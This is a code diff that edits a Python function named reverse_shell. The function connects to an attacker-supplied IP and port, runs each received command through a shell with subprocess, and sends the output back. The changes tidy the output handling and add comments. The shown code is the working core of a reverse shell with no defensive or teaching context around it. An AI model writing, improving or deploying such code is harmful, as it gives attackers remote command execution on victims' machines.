@@ -1,6 +1,5 @@
 import socket
 import subprocess
-import os
 
 def reverse_shell(attacker_ip, attacker_port):
     try:
@@ -11,9 +10,12 @@ def reverse_shell(attacker_ip, attacker_port):
             command = s.recv(1024).decode()
             if command.lower() == "exit":
                 break
+
+            # Execute the command
+            output = subprocess.run(command, shell=True, capture_output=True)
             
-            output = subprocess.run(command, shell=True, capture_output=True, text=True)
-            s.send(output.stdout.encode() + output.stderr.encode())
+            # Send back the output
+            s.send(output.stdout + output.stderr)
         
         s.close()
     except Exception as e:
